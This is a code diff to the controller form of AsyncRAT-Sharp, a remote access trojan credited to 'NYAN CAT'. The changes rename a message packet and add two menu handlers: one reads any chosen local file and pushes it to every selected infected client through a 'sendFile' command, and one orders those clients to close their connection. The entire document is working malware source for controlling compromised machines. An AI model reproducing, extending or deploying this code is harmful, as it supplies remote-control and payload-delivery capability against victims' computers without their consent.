@@ -7,6 +7,7 @@ using Microsoft.VisualBasic;
 using System.Linq;
 using System.Threading;
 using System.Drawing;
+using System.IO;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : AsyncRAT // Simple Socket
@@ -29,7 +30,7 @@ namespace AsyncRAT_Sharp
             Listener listener = new Listener();
             Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
             thread.Start(Settings.Port);
-
+            this.Text = string.Format("AsyncRAT-Sharp {0} // NYAN CAT", Settings.Version);
             while (true)
             {
                 await Task.Delay(1000);
@@ -47,7 +48,7 @@ namespace AsyncRAT_Sharp
                 else
                 {
                     MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "MessageBox";
+                    msgpack.ForcePathObject("Packet").AsString = "sendMessage";
                     msgpack.ForcePathObject("Message").AsString = URL;
                     foreach (ListViewItem C in listView1.SelectedItems)
                     {
@@ -59,6 +60,49 @@ namespace AsyncRAT_Sharp
                 }
             }
         }
+
+        private void sendFileToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    OpenFileDialog O = new OpenFileDialog();
+                    if (O.ShowDialog() == DialogResult.OK)
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "sendFile";
+                        msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
+                        msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(O.FileName);
+                        foreach (ListViewItem C in listView1.SelectedItems)
+                        {
+                            Clients CL = (Clients)C.Tag;
+                            CL.LV.ForeColor = Color.Red;
+                            CL.BeginSend(msgpack.Encode2Bytes());
+                            CL.LV.ForeColor = Color.Empty;
+                        }
+                    }
+                }
+                catch { }
+            }
+        }
+
+        private void closeConnectionToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "closeConnection";
+                    foreach (ListViewItem C in listView1.SelectedItems)
+                    {
+                        Clients CL = (Clients)C.Tag;
+                        CL.LV.ForeColor = Color.Red;
+                        CL.BeginSend(msgpack.Encode2Bytes());
+                        CL.LV.ForeColor = Color.Empty;
+                    }
+                }
+            }
+        
 
         private void ping_Tick(object sender, EventArgs e)
         {
@@ -100,5 +144,7 @@ namespace AsyncRAT_Sharp
                 listView1.Items[hitInfo.Item.Index].Selected = true;
             }
         }
+
+
     }
 }
